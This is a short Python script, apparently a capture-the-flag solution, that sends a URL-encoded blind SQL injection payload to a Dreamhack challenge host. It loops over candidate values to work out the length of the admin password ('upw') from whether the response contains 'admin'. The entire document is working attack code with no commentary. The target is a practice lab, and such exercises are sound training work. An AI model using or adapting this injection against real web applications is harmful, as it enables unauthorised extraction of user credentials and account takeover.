import requests

url = "http://host8.dreamhack.games:11560/?uid="

for i in range(50):
    r = requests.get(url + f"%27%7C%7C%28length%28upw%29%29%3D{i}%23")
    print(i)
    if 'admin' in r.text:
        break


pw_length = i
print(f"admin's length is {pw_length}")